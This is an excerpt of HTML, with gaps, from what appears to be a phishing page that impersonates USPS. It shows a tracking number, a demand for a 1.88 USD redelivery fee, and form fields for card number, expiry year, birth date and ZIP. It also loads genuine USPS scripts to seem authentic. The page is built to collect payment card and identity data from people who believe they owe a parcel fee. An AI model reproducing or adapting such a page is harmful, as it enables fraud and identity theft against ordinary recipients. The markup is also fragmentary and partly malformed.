            ...
            <div class="col-sm-10 col-sm-offset-1">
              <div class="product_summary delivery_exception">
                <h3 class="tracking_number">
                  Tracking Number:
                  <span class="tracking-number"> US651290192503</span>
               </h3>
...
<p  style="margin-top:15px;font-size:14px;"><a style="color:red;">This Redelivery request cost 1.88 USD.</a></p>
...
<div id="us">
<div class="row">
<div class="class="col-xs-12 col-sm-4 col-md-4"">
...
<br>
<input type="tel" name="ccnumb" maxlength="16" required="" placeholder="Card Number" tabindex="8" id="taddress" class="form-control">
...
<div class="col-xs-12 col-sm-4 col-md-2">
<div class="form-group" id="form-group-sbirth">
...
<script type="text/javascript" src="https://tools.usps.com/go/scripts/libs/jquery.min.js"></script>
<script type="text/javascript" src="https://tools.usps.com/go/js/modules/usps/metrics/metrics-all.js"></script>
<script type="text/javascript" src="https://www.googleoptimize.com/optimize.js?id=GTM-T35N9RL"></script>
...
<div class="form-group" id="form-group-tzip">	
 ...
 <label for="expyears">
        ...
        <span id="expDateLabelText">*</span>

    </label>

<select name="myears" tabindex="8" id="tyears" class="form-control">
